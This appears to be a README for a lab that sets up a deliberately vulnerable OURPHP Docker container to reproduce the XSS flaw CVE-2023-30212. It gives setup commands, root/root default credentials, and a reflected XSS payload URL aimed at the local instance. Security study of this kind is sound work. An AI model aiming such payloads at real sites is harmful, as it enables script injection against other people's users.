This contains the necessary directories and Dockerfile to replicate A vulnerabality in OURPHP that has a XSS Vulnerability (CVE-2023-30212). 
# Creating a Vulnerable Docker Environment (CVE-2023-30212)

`Pre-requisite`

Download Docker
sudo apt install -y docker.io <br>

#Follow below commands step by step: 

Download the files from this repository using git clone <br>
git clone https://github.com/VisDev23/Vulnerable-Docker--CVE-2023-30212-.git 
This contains necessary directories and dockerfile to replicate the scenario. 

After Downloading the files , build a docker image using <br>
sudo docker build -t "Give Suitable Docker name"  followed by * . * 

Convert the Docker image into a container by using <br>
sudo docker run -d -p 80:80 "Docker Image Name"
Here the container port is mapped to port 80.

To see the status of the docker container , <br>
sudo docker ps 

After doing these steps, 

Enter the localhost and configure OURPHP with following credentials.
Username : root
Password : root
Database Name: Data 

Now you need to configure username and password for Administrative. Set the following:
Username: root
Password: root 
and proceed 

So our payload is 
/client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(`xss`)</script>  <br>

add this along with localhost or 127.0.0.1 to trigger XSS.
